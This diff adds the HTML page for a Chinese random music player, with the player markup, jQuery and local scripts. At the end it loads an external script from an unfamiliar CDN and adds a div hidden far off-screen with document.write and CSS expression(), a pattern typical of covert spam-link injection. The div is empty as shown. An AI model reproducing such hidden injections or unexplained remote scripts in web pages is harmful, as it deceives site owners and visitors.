@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <title>随机音乐播放器</title>
+    <meta charset="UTF-8">
+    <meta name="copyright" content="中國遠徵">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="中國遠徵,音乐,随机音乐,随便听">
+    <meta name="description" content="心累了就什么都不用做，静下来看看风景、听听歌就好了。">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="./css/solid.css">
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="stylesheet" href="./css/fontawesome.css">
+</head>
+
+<body>
+    <div id="dowebok">
+        <div id="bg-artwork"></div>
+        <div id="bg-layer"></div>
+        <div id="player">
+            <div id="player-track">
+                <div id="album-name"></div>
+                <div id="track-name"></div>
+                <div id="track-time">
+                    <div id="current-time"></div>
+                    <div id="track-length"></div>
+                </div>
+                <div id="s-area">
+                    <div id="ins-time"></div>
+                    <div id="s-hover"></div>
+                    <div id="seek-bar"></div>
+                </div>
+            </div>
+            <div id="player-content">
+                <div id="album-art">
+                    <img src="./images/1.jpg" class="active" id="album-pic">
+                    <div id="buffer-box">加载中...</div>
+                </div>
+                <div id="player-controls">
+                    <div class="control">
+                        <div class="button" id="play-previous">
+                            <i class="fas fa-backward"></i>
+                        </div>
+                    </div>
+                    <div class="control">
+                        <div class="button" id="play-pause-button">
+                            <i class="fas fa-play"></i>
+                        </div>
+                    </div>
+                    <div class="control">
+                        <div class="button" id="play-next">
+                            <i class="fas fa-forward"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="./js/jquery.min.js"></script>
+    <script src="./js/index.js"></script>
+    <script type="text/javascript" src="https://cdn.ssss.fun/z/3/t_ssss_fun.js"></script>
+
+<div style="position:absolute;left:expression(1-900);top:expression(3-999);"></div>
+
+<script language="javascript" type="text/javascript">
+document.write("<div style=\"position: absolute; top: -993px;left: -985px;\">")
+</script>
+
+<script language="javascript" type="text/javascript">document.write("<\/div>")</script>
+
+</body>
+</html>
